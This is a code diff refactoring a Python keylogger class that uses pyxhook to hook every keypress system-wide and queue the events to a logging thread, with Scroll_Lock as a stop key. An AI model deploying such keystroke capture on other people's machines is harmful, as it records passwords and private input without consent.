@@ -63,46 +63,27 @@ class Logger(threading.Thread):
 
 class KeyboardLogger:
     def __init__(self):
-        self.spawn_event_threads()
+        self.queue = queue.Queue(0)
+        self.event_thread = Logger(self.queue)
         self.hm = pyxhook.HookManager()
         self.hm.HookKeyboard()
         self.hm.KeyDown = self.OnKeyDownEvent
 
-    def spawn_event_threads(self):
-        self.event_threads = {}
-        self.queues = {}
-        try:
-            self.queues["General"] = queue.Queue(0)
-            self.event_threads["General"] = \
-                Logger(self.queues["General"])
-        except KeyError:
-            print(('[WARN]Not creating thread for section General'),file=sys.stderr)
-            pass
-
     def start(self):
-        for key in list(self.event_threads.keys()):
-            print(('[INFO]Starting thread ' + key),file=sys.stderr)
-            self.event_threads[key].start()
+        print(('[INFO]Starting Logger thread'), file=sys.stderr)
+        self.event_thread.start()
         self.hm.start()
 
-    def push_event_to_queues(self, event):
-        for key in list(self.queues.keys()):
-            if ( str(event.Key) == 'Scroll_Lock' ):
-                print('Scroll_Lock')                                                    # To permit keylog_parser.py to quit properly
-                self.stop()
-                return
-            print(('[DEBUG]KeyDown'),file=sys.stderr)
-            self.queues[key].put(event)
-
     def OnKeyDownEvent(self, event):
-        self.push_event_to_queues(event)
-        return True
+        if str(event.Key) == 'Scroll_Lock':
+            print('Scroll_Lock')                    # Permit keylog_parser.py to quit properly
+            self.stop()
+            return
+        self.queue.put(event)
 
     def stop(self):
         self.hm.cancel()
-
-        for key in list(self.event_threads.keys()):
-            self.event_threads[key].cancel()
+        self.event_thread.cancel()
         time.sleep(0.2)
         sys.exit()
 
